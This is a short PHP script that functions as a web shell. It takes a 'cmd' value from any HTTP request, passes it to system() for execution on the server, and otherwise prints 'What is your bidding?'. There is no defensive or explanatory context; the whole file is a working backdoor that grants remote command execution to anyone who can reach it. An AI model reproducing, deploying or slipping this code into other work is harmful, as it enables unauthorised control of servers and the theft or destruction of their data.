<?php
   echo "run scrip" ;
  if(isset($_REQUEST['cmd'])) {
    echo "\r\nprint command " . $cmd  ;
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  } else {
    echo "What is your bidding?";
  }
?>
